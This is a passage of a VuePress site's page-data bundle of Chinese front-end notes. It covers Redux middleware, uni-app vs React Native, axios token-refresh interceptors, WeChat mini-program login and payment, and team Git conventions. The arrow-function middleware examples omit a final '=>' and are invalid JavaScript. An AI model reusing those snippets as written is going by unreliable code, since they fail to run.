'react-redux';\n",charsets:{cjk:!0}},{title:"Redux中间件",frontmatter:{},regularPath:"/React/Redux/07-Redux%E4%B8%AD%E9%97%B4%E4%BB%B6.html",relativePath:"React/Redux/07-Redux中间件.md",key:"v-0c11bfa5",path:"/React/Redux/07-Redux%E4%B8%AD%E9%97%B4%E4%BB%B6.html",headers:[{level:2,title:"自定义redux中间件",slug:"自定义redux中间件",normalizedTitle:"自定义redux中间件",charIndex:494},{level:3,title:"applyMiddleware()",slug:"applymiddleware",normalizedTitle:"applymiddleware()",charIndex:557},{level:3,title:"基本语法",slug:"基本语法",normalizedTitle:"基本语法",charIndex:727},{level:3,title:"示例：日志中间件",slug:"示例-日志中间件",normalizedTitle:"示例：日志中间件",charIndex:947},{level:3,title:"示例：错误处理中间件",slug:"示例-错误处理中间件",normalizedTitle:"示例：错误处理中间件",charIndex:1550}],headersStr:"自定义redux中间件 applyMiddleware() 基本语法 示例：日志中间件 示例：错误处理中间件",content:"# Redux中间件\n\nRedux 中一个简单的同步数据流动场景，点击 button 后，在回调中分发一个 action， reducer 收到 action 后，更新 state 并通知 view 重新渲染。\n\nRedux同步数据流动\n\n但是，如果需要打印每一个 action 信息来调试，就得去改 dispatch 或者 reducer 实现，使其具有 打印日志的功能。又比如，点击 button 后，需要先去服务端请求数据，只有等数据返回后，才能 重新渲染 view，此时我们希望 dispatch 或 reducer 拥有异步请求的功能。再比如，需要异步请求 数据返回后，打印一条日志，再请求数据，再打印日志，再渲染。\n\n面对多样的业务场景，单纯地修改 dispatch 或 reducer 的代码显然不具有普适性，我们需要 的是可以组合的、自由插拔的插件机制，这一点 Redux 借鉴了 Koa里 middleware 的思想。另外，Redux 中 reducer 更关心的是数 据的转化逻辑，所以 middleware 就是为了增强 dispatch 而出现的。\n\n\n\n\n# 自定义redux中间件\n\nredux中间一共嵌套了三层函数，分别传递了store、next、action这三个参数。\n\n\n# applyMiddleware()\n\n其实applyMiddleware就是Redux的一个原生方法，将所有中间件组成一个数组，依次执行。\n\n//中间件多了可以当做参数依次传进去\nconst store = createStore(\n  reducers,\n  applyMiddleware(thunk, logger)\n);\n\n\n\n# 基本语法\n\nimport { createStore, applyMiddleware} from \"redux\";\nconst middleware = store => next => action {\n    //code....\n    next(action);\n}\n\nconst store = createStore(\n    reducers,\n    applyMiddleware(middleware)\n)\n\n\n\n# 示例：日志中间件\n\nimport { createStore, applyMiddleware} from \"redux\";\n//ES5\nfunction logger(store) {\n    return function (next) {\n        return function (action) {\n            console.log('dispatching', action)\n            let result = next(action)\n            console.log('next state', store.getState())\n            return result\n        }\n    }\n}\n\n//ES6 箭头函数方式\nconst logger = store => next => action {\n    console.log('dispatching', action);\n    let result = next(action)\n    console.log('next state', store.getState());\n    return result;\n}\n\nconst store = createStore(reducer,applyMiddleware(logger))\n\n\n\n# 示例：错误处理中间件\n\nimport { createStore, applyMiddleware} from \"redux\";\n\nconst error = store => next => action {\n    try{\n        next(action);\n    }catch(err){\n        console.log(\"Error:\",err)\n    }\n}\nconst store = createStore(reducer,applyMiddleware(error))\n",normalizedContent:"# redux中间件\n\nredux 中一个简单的同步数据流动场景，点击 button 后，在回调中分发一个 action， reducer 收到 action 后，更新 state 并通知 view 重新渲染。\n\nredux同步数据流动\n\n但是，如果需要打印每一个 action 信息来调试，就得去改 dispatch 或者 reducer 实现，使其具有 打印日志的功能。又比如，点击 button 后，需要先去服务端请求数据，只有等数据返回后，才能 重新渲染 view，此时我们希望 dispatch 或 reducer 拥有异步请求的功能。再比如，需要异步请求 数据返回后，打印一条日志，再请求数据，再打印日志，再渲染。\n\n面对多样的业务场景，单纯地修改 dispatch 或 reducer 的代码显然不具有普适性，我们需要 的是可以组合的、自由插拔的插件机制，这一点 redux 借鉴了 koa里 middleware 的思想。另外，redux 中 reducer 更关心的是数 据的转化逻辑，所以 middleware 就是为了增强 dispatch 而出现的。\n\n\n\n\n# 自定义redux中间件\n\nredux中间一共嵌套了三层函数，分别传递了store、next、action这三个参数。\n\n\n# applymiddleware()\n\n其实applymiddleware就是redux的一个原生方法，将所有中间件组成一个数组，依次执行。\n\n//中间件多了可以当做参数依次传进去\nconst store = createstore(\n  reducers,\n  applymiddleware(thunk, logger)\n);\n\n\n\n# 基本语法\n\nimport { createstore, applymiddleware} from \"redux\";\nconst middleware = store => next => action {\n    //code....\n    next(action);\n}\n\nconst store = createstore(\n    reducers,\n    applymiddleware(middleware)\n)\n\n\n\n# 示例：日志中间件\n\nimport { createstore, applymiddleware} from \"redux\";\n//es5\nfunction logger(store) {\n    return function (next) {\n        return function (action) {\n            console.log('dispatching', action)\n            let result = next(action)\n            console.log('next state', store.getstate())\n            return result\n        }\n    }\n}\n\n//es6 箭头函数方式\nconst logger = store => next => action {\n    console.log('dispatching', action);\n    let result = next(action)\n    console.log('next state', store.getstate());\n    return result;\n}\n\nconst store = createstore(reducer,applymiddleware(logger))\n\n\n\n# 示例：错误处理中间件\n\nimport { createstore, applymiddleware} from \"redux\";\n\nconst error = store => next => action {\n    try{\n        next(action);\n    }catch(err){\n        console.log(\"error:\",err)\n    }\n}\nconst store = createstore(reducer,applymiddleware(error))\n",charsets:{cjk:!0}},{title:"ReactRedux工作流程",frontmatter:{},regularPath:"/React/Redux/08-ReactRedux%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B.html",relativePath:"React/Redux/08-ReactRedux工作流程.md",key:"v-00ce3b46",path:"/React/Redux/08-ReactRedux%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B.html",headers:[{level:2,title:"ReactRedux工作流程",slug:"reactredux工作流程",normalizedTitle:"reactredux工作流程",charIndex:2},{level:2,title:"redux原理图",slug:"redux原理图",normalizedTitle:"redux原理图",charIndex:23},{level:2,title:"react-redux模型图",slug:"react-redux模型图",normalizedTitle:"react-redux模型图",charIndex:38}],headersStr:"ReactRedux工作流程 redux原理图 react-redux模型图",content:"# ReactRedux工作流程\n\n\n\n\n# redux原理图\n\n\n\n\n# react-redux模型图\n\n",normalizedContent:"# reactredux工作流程\n\n\n\n\n# redux原理图\n\n\n\n\n# react-redux模型图\n\n",charsets:{cjk:!0}},{title:"Vue3  下图转载此链接",frontmatter:{},regularPath:"/vue/Vue3/01-Vue3.html",relativePath:"vue/Vue3/01-Vue3.md",key:"v-d679d410",path:"/vue/Vue3/01-Vue3.html",headers:[{level:2,title:"学前了解",slug:"学前了解",normalizedTitle:"学前了解",charIndex:19},{level:2,title:"基础知识",slug:"基础知识",normalizedTitle:"基础知识",charIndex:30},{level:2,title:"组件相关语法",slug:"组件相关语法",normalizedTitle:"组件相关语法",charIndex:41},{level:2,title:"高级语法",slug:"高级语法",normalizedTitle:"高级语法",charIndex:54},{level:2,title:"高级语法",slug:"高级语法-2",normalizedTitle:"高级语法",charIndex:54},{level:2,title:"配套工具",slug:"配套工具",normalizedTitle:"配套工具",charIndex:76}],headersStr:"学前了解 基础知识 组件相关语法 高级语法 高级语法 配套工具",content:"# Vue3 下图转载此链接\n\n\n# 学前了解\n\n\n\n\n# 基础知识\n\n\n\n\n# 组件相关语法\n\n\n\n\n# 高级语法\n\n\n\n\n# 高级语法\n\n\n\n\n# 配套工具\n\n",normalizedContent:"# vue3 下图转载此链接\n\n\n# 学前了解\n\n\n\n\n# 基础知识\n\n\n\n\n# 组件相关语法\n\n\n\n\n# 高级语法\n\n\n\n\n# 高级语法\n\n\n\n\n# 配套工具\n\n",charsets:{cjk:!0}},{title:"项目分享",frontmatter:{},regularPath:"/Summarize/",relativePath:"Summarize/README.md",key:"v-e553a3d0",path:"/Summarize/",headers:[{level:2,title:"跨端技术评估 (uniapp ReactNative )",slug:"跨端技术评估-uniapp-reactnative",normalizedTitle:"跨端技术评估 (uniapp reactnative )",charIndex:13},{level:3,title:"官网地址和介绍",slug:"官网地址和介绍",normalizedTitle:"官网地址和介绍",charIndex:47},{level:3,title:"技术学习成本和难度",slug:"技术学习成本和难度",normalizedTitle:"技术学习成本和难度",charIndex:60},{level:3,title:"优势劣势",slug:"优势劣势",normalizedTitle:"优势劣势",charIndex:75},{level:3,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:85},{level:2,title:"刷新Token实现",slug:"刷新token实现",normalizedTitle:"刷新token实现",charIndex:91},{level:3,title:"需求解析",slug:"需求解析",normalizedTitle:"需求解析",charIndex:106},{level:3,title:"实现思路",slug:"实现思路",normalizedTitle:"实现思路",charIndex:116},{level:3,title:"实现",slug:"实现",normalizedTitle:"实现",charIndex:98},{level:2,title:"小程序登录",slug:"小程序登录",normalizedTitle:"小程序登录",charIndex:132},{level:3,title:"登录流程时序",slug:"登录流程时序",normalizedTitle:"登录流程时序",charIndex:143},{level:3,title:"UnionID 机制说明",slug:"unionid-机制说明",normalizedTitle:"unionid 机制说明",charIndex:155},{level:3,title:"流程开始",slug:"流程开始",normalizedTitle:"流程开始",charIndex:173},{level:2,title:"微信相关开发常见问题",slug:"微信相关开发常见问题",normalizedTitle:"微信相关开发常见问题",charIndex:181},{level:3,title:"微信小程序",slug:"微信小程序",normalizedTitle:"微信小程序",charIndex:197},{level:3,title:"微信公众号",slug:"微信公众号",normalizedTitle:"微信公众号",charIndex:208},{level:2,title:"CSS动画集合",slug:"css动画集合",normalizedTitle:"css动画集合",charIndex:217},{level:2,title:"前端规范总结",slug:"前端规范总结",normalizedTitle:"前端规范总结",charIndex:228},{level:3,title:"项目管理",slug:"项目管理",normalizedTitle:"项目管理",charIndex:240},{level:3,title:"GIT管理",slug:"git管理",normalizedTitle:"git管理",charIndex:250},{level:3,title:"项目结构",slug:"项目结构",normalizedTitle:"项目结构",charIndex:261},{level:3,title:"代码规范",slug:"代码规范",normalizedTitle:"代码规范",charIndex:271},{level:3,title:".vue模版内的html",slug:"vue模版内的html",normalizedTitle:".vue模版内的html",charIndex:281},{level:3,title:"CSS/LESS/SASS规范",slug:"css-less-sass规范",normalizedTitle:"css/less/sass规范",charIndex:299},{level:3,title:"JS规范",slug:"js规范",normalizedTitle:"js规范",charIndex:320},{level:3,title:"资源约束",slug:"资源约束",normalizedTitle:"资源约束",charIndex:330}],headersStr:"跨端技术评估 (uniapp ReactNative ) 官网地址和介绍 技术学习成本和难度 优势劣势 总结 刷新Token实现 需求解析 实现思路 实现 小程序登录 登录流程时序 UnionID 机制说明 流程开始 微信相关开发常见问题 微信小程序 微信公众号 CSS动画集合 前端规范总结 项目管理 GIT管理 项目结构 代码规范 .vue模版内的html CSS/LESS/SASS规范 JS规范 资源约束",content:"# 项目分享\n\n\n\n * 跨端技术评估 (uniapp ReactNative )\n   * 官网地址和介绍\n   * 技术学习成本和难度\n   * 优势劣势\n   * 总结\n * 刷新Token实现\n   * 需求解析\n   * 实现思路\n   * 实现\n * 小程序登录\n   * 登录流程时序\n   * UnionID 机制说明\n   * 流程开始\n * 微信相关开发常见问题\n   * 微信小程序\n   * 微信公众号\n * CSS动画集合\n * 前端规范总结\n   * 项目管理\n   * GIT管理\n   * 项目结构\n   * 代码规范\n   * .vue模版内的html\n   * CSS/LESS/SASS规范\n   * JS规范\n   * 资源约束\n\n\n\n\n# 跨端技术评估 (uniapp ReactNative )\n\n\n# 官网地址和介绍\n\nuni-app\n\n> uni-app 是一个使用 Vue.js 开发所有前端应用的框架，开发者编写一套代码，可发布到iOS、Android、Web（响应式）、以及各种小程序（微信/支付宝/百度/头条/QQ/快手/钉钉/淘宝）、快应用等多个平台。\n\nReactnative\n\n> 使用 React 来创建 Android 和 iOS 的原生应用\n\n\n# 技术学习成本和难度\n\n * ReactNative， React，要求精通Flex布局，要求原生开发协作。\n * uni-app，Vue，了解小程序。\n\n\n# 优势劣势\n\n# 性能\n\n * uni-app 性能问题存在瓶颈，原生通信受限制，需要根据官方提供间接通信\n * Reactnative 性能基本和原生应用无大差别\n\n# 多端\n\n * uni-app 可打包为App(安卓、ios) 小程序 H5 (需要写条件编译)\n * Reactnative 只可打包为App(安卓、ios)\n\n# UI\n\n * uni-app 只需要写一套界面ui，就可以适应不同手机的用户\n * Reactnative 在iOS和Android平台上，使用2套ui库\n\n# 生态\n\n * uni-app 全端推送（UniPush集成了iOS、华为、小米、OPPO等众多原厂推送）、各种国内登陆、支付、分享SDK、各种国内地图、各种ui库、以及Echart图表等\n * Reactnative facebook登陆分享、Google地图等\n\n\n# 总结\n\n * uniapp 速度要快一点，学习和开发效率稍高，文档稍乱，多端编译有小bug，小问题较多 或 条件编译处理。\n * Reactnative 不支持小程序 h5 等。\n * uniapp 推送 登录 支付 ui库等 生态较好。\n * Reactnative 性能高、堪比原生。\n\n> uniapp 开发较小项目较为合适，速度快 但与原生通信通信限制。开发基本的App uniapp封装的Api基本够用。\n\n> ReactNative 开发效率没有uni-app高、要求懂点原生 但性能较好。\n\n\n# 刷新Token实现\n\n> 前端登录后，后端返回token rtoken 当token过期时要求用旧token根据rtoken去获取新的token，前端需要做到无痛刷新token，即请求刷新token时要做到用户无感知。\n\n\n# 需求解析\n\n当用户发起一个请求时，判断token是否已过期，若已过期则先调refresh接口，拿到新的token后再继续执行之前的请求。 这个问题的难点在于：当同时发起多个请求，而刷新token的接口还没返回，此时其他请求该如何处理？\n\n\n# 实现思路\n\n * 方法一：\n   \n   在请求发起前拦截每个请求，判断token的有效时间是否已经过期，若已过期，则将请求挂起，先刷新token后再继续请求。\n   \n   * 优点： 在请求前拦截，能节省请求，省流量。\n   * 缺点： 需要后端额外提供一个token过期时间的字段；使用了本地时间判断，若本地时间被篡改，特别是本地时间比服务器时间慢时，拦截会失败。\n\nTIP\n\ntoken有效时间建议是时间段，类似缓存的MaxAge，而不要是绝对时间。当服务器和本地时间不一致时，绝对时间会有问题。\n\n * 方法二：\n   \n   不在请求前拦截，而是拦截返回后的数据。先发起请求，接口返回过期后，先刷新token，再进行一次重试\n   \n   * 优点：不需额外的token过期字段，不需判断时间。\n   * 缺点： 会消耗多一次请求，耗流量。\n\n\n# 实现\n\n# 先看一道面试题\n\nconsole.log('start')\n\nsetTimeout(() => {\n    console.log('setTimeout')\n}, 0)\n\nnew Promise((resolve) => {\n        console.log('promise')\n        resolve()\n    })\n    .then(() => {\n        console.log('then1')\n    })\n    .then(() => {\n        console.log('then2')\n    })\n\nconsole.log('end')\n\n输出为\nstart\npromise\nend\nthen1\nthen2\nsetTimeout\n\n\n# Promise对象有以下两个特点。\n\n（1）对象的状态不受外界影响。Promise对象代表一个异步操作，有三种状态：pending（进行中）、fulfilled（已成功）和rejected（已失败）。只有异步操作的结果，可以决定当前是哪一种状态，任何其他操作都无法改变这个状态。这也是Promise这个名字的由来，它的英语意思就是“承诺”，表示其他手段无法改变。\n\n（2）一旦状态改变，就不会再变，任何时候都可以得到这个结果。Promise对象的状态改变，只有两种可能：从pending变为fulfilled和从pending变为rejected。只要这两种情况发生，状态就凝固了，不会再变了，会一直保持这个结果，这时就称为 resolved（已定型）。如果改变已经发生了，你再对Promise对象添加回调函数，也会立即得到这个结果。这与事件（Event）完全不同，事件的特点是，如果你错过了它，再去监听，是得不到结果的。\n\n# 代码实现\n\nlet isRefreshing = false // 标记是否正在刷新 token 避免重新请求\nlet requests = [] // 存储待重发请求的数组\n\n//HTTPresponse拦截\naxios.interceptors.response.use(res => {\n    NProgress.done();\n    const status = Number(res.status) || 200;\n    const statusWhiteList = website.statusWhiteList || [];\n    const message = res.data.message || '未知错误';\n    //如果在白名单里则自行catch逻辑处理\n    if (statusWhiteList.includes(status)) return Promise.reject(res);\n    //如果是401则跳转到登录页面\n    if (status === 401 && res.data.code === 401) {\n        if (res.data.message == 'token无效') {\n            let {\n                r_token\n            } = getToken();\n            let reftokenMethods = new reftokenRreq(res.config, r_token);\n            return reftokenMethods.reftokenRreq();\n        } else {\n            store.dispatch('FedLogOut').then(() => router.push({\n                path: '/login'\n            }));\n        }\n    }\n    // 如果请求为非200否者默认统一处理\n    if (status !== 200) {\n        Message({\n            message: message,\n            type: 'error'\n        })\n        return Promise.reject(new Error(message))\n    }\n    return res;\n}, error => {\n    NProgress.done();\n    return Promise.reject(new Error(error));\n})\n\nclass reftokenRreq {\n    constructor(config, r_token) {\n        this.config = config;\n        this.r_token = r_token;\n    }\n    //重复执行请求操作\n    repeatRequest({\n        url,\n        method,\n        data,\n        params,\n        headers\n    }) {\n        return axios({\n            headers,\n            url,\n            method,\n            data,\n            params\n        })\n    }\n    // 刷新token 请求\n    reftokenRreq() {\n        if (!isRefreshing) {\n            isRefreshing = true\n            return reftoken(this.r_token).then((res) => {\n                    if (res.data.code == 200) {\n                        store.commit('SET_TOKEN', res.data.data);\n                        requests.forEach((cb) => cb());\n                        requests = [] // 重新请求完清空\n                        return this.repeatRequest(this.config)\n                    } else {\n                        store.dispatch('FedLogOut').then(() => router.push({\n                            path: '/login'\n                        }));\n                    }\n                })\n                .finally(() => {\n                    // 设置请求是否成功设置为false\n                    isRefreshing = false\n                })\n        } else {\n            // 返回未执行 resolve 的 Promise\n            return new Promise(resolve => {\n                // 用函数形式将 resolve 存入，等待刷新后再执行\n                requests.push(() => {\n                    resolve(this.repeatRequest(this.config))\n                })\n            })\n        }\n    }\n\n}\n\n\n\n# 小程序登录\n\n> 小程序可以通过微信官方提供的登录能力方便地获取微信提供的用户身份标识，快速建立小程序内的用户体系。\n\n\n# 登录流程时序\n\nWARNING\n\n会话密钥 session_key 是对用户数据进行 加密签名 的密钥。为了应用自身的数据安全，开发者服务器不应该把会话密钥下发到小程序，也不应该对外提供这个密钥。 临时登录凭证 code 只能使用一次\n\n\n\n\n# UnionID 机制说明\n\n> 如果开发者拥有多个移动应用、网站应用、和公众帐号（包括小程序），可通过 UnionID 来区分用户的唯一性，因为只要是同一个微信开放平台帐号下的移动应用、网站应用和公众帐号（包括小程序），用户的 UnionID 是唯一的。换句话说，同一用户，对同一个微信开放平台下的不同应用，UnionID是相同的。\n\n\n# 流程开始\n\n小程序登录 用户信息相关接口已在 2021年4月 已做出跳转，具体点击 Link\n\n\n\n登录逻辑\n\n 1. 用户第一次登录 （旧逻辑）\n\n * 弹窗是否同意授权（调取接口获取是否已有注册）\n * 调用手机手机号授权直接注册登录、\n\n 1. 用户第一次登录 （新逻辑）\n\n * 调用login 登录后直接获取code 如果失败后获取后台给的unionId 通过手机号注册并登录（需要注意login 获取的code 是否过期 避免重复请求和 session_key 对应不上）\n\n 2. 用户不是第一次登录。共同逻辑\n\n * 本地有token 并且rtoken 未过期的情况直接换rtoken。\n * 本地有token rtoken token 都过期的情况 判断rtoken 刷新失败 跳到我的页面，用户点击登录。\n * 本地没有token 重复第一步 检测用户授权后登录\n\n一. 调用wx.login生成code （如果是老用户 直接登录成功）\n\n// 微信授权登录 封装\nexport const loginByOpenid = () => {\n    return new Promise((resolve, reject) => {\n        // https://developers.weixin.qq.com/community/develop/doc/000cacfa20ce88df04cb468bc52801\n        uni.login({\n            success(login) {\n                // login 返回 并存下 是因为 避免新用户进来 又不注册的特殊情况。（因为login 的 code 是有时间限制的）\n                const code = login.code;\n                uni.setStorageSync('code', code);\n                //整合数据请求登录 \n                /*\n                wxlogin 接口是服务端 根据 code 以及小程序的 appid secret  grant_type 获取 UnionID  和  session_key\n                UnionID 是 唯一的  可在数据库中查询出 用户是否存在 \n                    存在    生成token 直接返回前端并登录\n                    不存在  证明用户未登录 返回特殊编码（后续使用202判断）\n                */\n                wxlogin('/mall-cloud-system/authService/xcxLoginByUnionId', {\n                    code\n                }).then(res => {\n                    resolve(res)\n                }).catch((erro) => {\n                    reject(erro)\n                })\n            },\n            fail(erro) {\n                reject(erro)\n            }\n        })\n    })\n}\n// loginByOpenid 方法调用\nloginByOpenid().then(res => {\n    //  这里的 Promise 返回 请求 wxlogin 接口的数据\n    if (res.code == 200) {\n        // 如果200了 证明 login.code 正确 是老用户 并返回了token\n        uni.showToast({\n            title: '登录成功',\n            icon: 'none'\n        })\n        //登录成功\n        const token = {\n                a_token: res.data.a_token,\n                r_token: res.data.r_token,\n            }\n            ......\n    } else if (res.code == 202) {\n        // 如果是202（可与后台协商为注册的信息） 把当前用户唯一的 UnionID 存下来 后续手机号 注册登录 需要参数\n        const unid = res.data;\n        uni.setStorageSync('unionId', unid);\n        // 这里后续应弹出 授权 用户信息  和 手机号 方法 \n        ......\n    } else if (res.code == 500) {\n        uni.showToast({\n            title: res.message,\n            icon: 'none'\n        })\n    }\n}).catch(error => {\n    uni.showToast({\n        title: '登录失败，请重新登录!',\n        icon: 'none'\n    })\n})\n\n\n二、wx.getUserProfile 获取用户资料 和 button 组件 open-type=\"getPhoneNumber\" 获取手机号。 （获取用户资料 和手 机号 顺序可根据需求自定义）\n\nWARNING\n\ngetUserProfile 获取用户信息。页面产生点击事件后才可调用，每次请求都会弹出授权窗口，用户同意后返回 userInfo. 该接口用于替换 wx.getUserInfo\n\ngetPhoneNumber 需要将 button 组件 open-type 的值设置为 getPhoneNumber，当用户点击并同意之后，可以通过 bindgetphonenumber 事件回调获取到微信服务器返回的加密数据， 然后在第三方服务端结合 session_key 以及 app_id 进行解密获取手机号。\n\n在回调中调用 wx.login 登录，可能会刷新登录态。此时服务器使用 code 换取的 sessionKey 不是加密时使用的 sessionKey，导致解密失败。建议开发者提前进行 login；或者在回调中先使用 checkSession 进行登录态检查，避免 login 刷新登录态。\n\ncheckSession 检查登录态是否过期。 通过 wx.login 接口获得的用户登录态拥有一定的时效性。用户越久未使用小程序，用户登录态越有可能失效。反之如果用户一直在使用小程序，则用户登录态一直保持有效。具体时效逻辑由微信维护，对开发者透明。开发者只需要调用 wx.checkSession 接口检测当前用户登录态是否有效。\n\n登录态过期后开发者可以再调用 wx.login 获取新的用户登录态。调用成功说明当前 session_key 未过期，调用失败说明 session_key 已过期。更多使用方法详见 小程序登录。\n\n<u-button type=\"primary\" @click=\"getuserinfo\">使用微信授权登录</u-button>\n\n<u-button open-type=\"getPhoneNumber\" type=\"primary\" @getphonenumber=\"getPhoneNumber\">授权手机号登录</u-button>\n\n\n// 用户首次登录\t loginByOpenid 失败后处理的\nexport const loginByMobile = (callback) => {\n    function mobileFun(code) {\n        // 后台返回的unionId\n        let unionId = uni.getStorageSync('unionId');\n        // 获取手机获得的\n        let iv = uni.getStorageSync('cashIv');\n        let encryptedData = uni.getStorageSync('cashEncryptedData');\n        let UserProfile = uni.getStorageSync('UserProfile');\n        // xcxLoginByMobile 接口 向后台传参 解密手机号的字段 和 当前用户的资料 \n        wxlogin('/mall-cloud-system/authService/xcxLoginByMobile', {\n            unionId,\n            iv,\n            encryptedData,\n            code,\n            ...UserProfile\n        }).then(res => {\n            // 在参数回调 中传入 接口成功 或 失败 后的处理 \n            callback(res)\n        }).catch((res) => {\n            callback(res)\n        })\n    }\n    // 这个方法用于检测 检查登录态是否过期\n    uni.checkSession({\n        success(res) {\n            // 没有过期的话 证明 存在的的code 可直接使用\n            console.log(res, '没有过期')\n            //session_key 未过期，并且在本生命周期一直有效\n            let code = uni.getStorageSync('code');\n            mobileFun(code)\n        },\n        fail(res) {\n            console.log(res, '已过期')\n            // session_key 已经失效，需要重新执行登录流程 获取code\n            uni.login({\n                success(res) {\n                    mobileFun(res.code)\n                },\n                fail() {\n                    uni.showToast({\n                        title: '登录失败，请重试！',\n                        icon: 'none'\n                    })\n                }\n            })\n        }\n    })\n}\n\n// getUserProfile 获取用户资料 头像 昵称 性别 等信息\ngetuserinfo(res) {\n    uni.getUserProfile({\n        desc: '登录同步数据',\n        success: (res) => {\n            // 这里成功获取后 把用户信息存下来 调取手机号登录\n            uni.setStorageSync('UserProfile', res.userInfo);\n        },\n        fail: (res) => {\n            console.log(res)\n            uni.showToast({\n                title: '授权失败!',\n                icon: 'none'\n            })\n        }\n    })\n}\n\n// 用户手机号登录\ngetPhoneNumber(res) {\n    if (res.detail.errMsg == \"getPhoneNumber:fail user deny\") {\n        uni.showToast({\n            title: '授权失败!',\n            icon: 'none'\n        })\n        return;\n    } else {\n        //用户同意授权手机号\n        //    iv 加密算法的初始向量，详细见加密数据解密算法\n        uni.setStorageSync('cashIv', res.detail.iv);\n        //    encryptedData  包括敏感数据在内的完整用户信息的加密数据，详细见加密数据解密算法\n        uni.setStorageSync('cashEncryptedData', res.detail.encryptedData);\n        loginByMobile(res => {\n            if (res.code == 200) {\n                uni.showToast({\n                    title: '登录成功',\n                    icon: 'none'\n                })\n                this.show = false;\n                //登录成功\n                //登录成功\n                let token = {\n                        a_token: res.data.a_token,\n                        r_token: res.data.r_token,\n                    }\n                    ......\n            } else {\n                uni.showToast({\n                    title: '登录失败，请重试！',\n                    icon: 'none'\n                })\n            }\n        })\n    }\n}\n\n\n\n# 微信相关开发常见问题\n\n\n# 微信小程序\n\n# 项目架构设置\n\nWARNING\n\n合理使用分包加载\n\n> 整个小程序所有分包大小不超过 20M 单个分包/主包大小不能超过 2M\n\n * 承载更多功能：小程序单个代码包的体积上限为 2M，使用分包可以提升小程序代码包总体积上限，承载更多的功能与服务。\n * 降低代码包下载耗时：使用分包后可以显著减少启动时需要下载的代码包大小，在不影响功能正常使用的前提下，有效降低启动耗时。\n * 降低小程序代码注入耗时：若未开启按需注入，小程序编译时会将所有 js 文件打包成同一个文件一次性的注入，并执行所有页面和自定义组件的代码。分包后可以降低注入和实际执行的代码量，从而降低注入耗时。\n * 降低页面渲染耗时：使用分包可以避免不必要的组件和页面初始化。\n * 降低内存占用：分包能够实现页面、组件和逻辑较粗粒度的按需加载，从而降低内存的占用。 此外，结合分包加载的几个扩展功能，可以进一步优化启动耗时\n\n避免非必要的全局自定义组件和插件\n\n> 如果不是公共组件 避免放入全局组件中。如果插件只在某个分包的中使用，请仅在分包中引用插件。\n\n控制代码包内的资源文件\n\n> 开发中的静态资源（静态图片、静态文件）尽量使用CDN , 例如阿里云oss。\n\n# 支付 文档\n\nWARNING\n\n> wx.requestPayment(Object object) 需要注意后端返回的支付参数 大小写问题。必须和文档种的key值一一对应。\n\n# 登录授权 - 文档\n\n# 其他开放能力相关文档\n\n# 其他细节问题\n\n * 使用uniapp开发，uni.previewImage会导致触发App.vue的onShow方法。\n * 使用web-view 指向网页的链接。可打开关联的公众号的文章，其它网页需登录小程序管理后台配置业务域名。\n * 体验者小程序 需要 打开开发调试 才能访问业务域名之外的接口，比如本地调试接口。\n\n\n# 微信公众号\n\n# 网页授权 文档\n\nWARNING\n\n需要配置业务域名和更目录验证文件。\n\n# JS-SDK 开发能力 文档\n\nWARNING\n\n微信公众号的开放能力 需要统一引用、使用。 例如：\n\nwx.config({\n    debug: true, // 开启调试模式,调用的所有api的返回值会在客户端alert出来，若要查看传入的参数，可以在pc端打开，参数信息会通过log打出，仅在pc端时才会打印。\n    appId: '', // 必填，公众号的唯一标识\n    timestamp: , // 必填，生成签名的时间戳\n    nonceStr: '', // 必填，生成签名的随机串\n    signature: '', // 必填，签名\n    jsApiList: [] // 必填，需要使用的JS接口列表\n});\n\n\n之前微信公众号暴露的方法 在文档中不体现。但是还可以继续使用。例如支付方法\n\nwindow.WeixinJSBridge.invoke(\n    'getBrandWCPayRequest',\n    payData,\n    (res) => {\n        // 成功\n        if (res.err_msg == 'get_brand_wcpay_request:ok') {\n            uni.$u.toast('支付成功!');\n            uni.reLaunch({\n                url: '/pages/paySuccess/index',\n            });\n            // 失败\n        } else if (res.err_msg == 'get_brand_wcpay_request:cancel') {\n            // Toast('支付失败!')\n            uni.$u.toast('取消支付!');\n        }\n    },\n    (err) => {\n        uni.$u.toast('支付失败!');\n    }\n);\n\n\n目前公众号v3支付成功后 不允许跳转到自定义页面了。只能关闭或者跳转微信自己的配置页面 相关文档\n\n\n# CSS动画集合\n\n * https://lhammer.cn/You-need-to-know-css/#/zh-cn/\n\n * https://chokcoco.github.io/CSS-Inspiration/#/\n\n * https://qishaoxuan.github.io/css_tricks/\n\n * https://tobiasahlin.com/spinkit/\n\n * https://animista.net/\n\n * https://animate.style/\n\n * http://ianlunn.github.io/Hover/\n\n * http://kristofferandreasen.github.io/wickedCSS/#\n\n * https://angrytools.com/css/animation/\n\n * https://elrumordelaluz.github.io/csshake/\n\n\n# 前端规范总结\n\n\n# 项目管理\n\n# 项目介绍文件(README.md文件)\n\nTIP\n\n# 最佳实践\n\n助产空间后台管理\n\n\n## Project setup\n\nnpm install\n\n### Compiles and hot-reloads for development\n\nnpm run serve\n\n### Compiles and minifies for production (生产环境 build)\n\nnpm run build\n\n### Compiles and minifies for uat (uat环境 build)\n\nnpm run uat\n\n### Compiles and minifies for test (test环境 build)\n\nnpm run test\n\n### Lints and fixes files\n\nnpm run lint\n\n### Run your unit tests\n\nnpm run test:unit\n\n### Run your end-to-end tests\n\nnpm run test:e2e\n\n\n\n# GIT管理\n\n# 分支管理\n\n每一个项目的分支都有两个基本分支 master (项目介绍文件)和 dev (开发分支)\n\n * master分支在项目创建之初只是起到介绍的作用，不再进行修改。\n\n * dev分支是项目的开发分支，由负责人管理，在每次团队其他成员写了新的功能，由负责人进行分支合并和功能合并.\n\n * 版本上线dev合并到master。版本迭代从master迁移 ，如：由1.0-> dev2.0 dev3.0\n\n# git commit规范\n\n> commit是为了每次提交都有相关的描述文字来解释每次提交的代码，为了其他成员能更好的看懂代码，更好的规范还是很有必要的。\n\n代码提交的话最好是每天都进行提交，能看到你每天完成了什么\n\ngit提交推荐使用git官方的桌面应用GitHub Desktop（更好的代码可视化和不再使用单一的命令行）\n\nTIP\n\n基本常用的几个\n\nfeat：新功能（feature）\n\nfix：修补bug\n\ndocs：文档（documentation）\n\nstyle： 格式（不影响代码运行的变动）\n\nrefactor：重构（即不是新增功能，也不是修改bug的代码变动）\n\ntest：增加测试\n\nchore：构建过程或辅助工具的变动\n\n细的介绍在阮一峰大佬的Commit message和Change 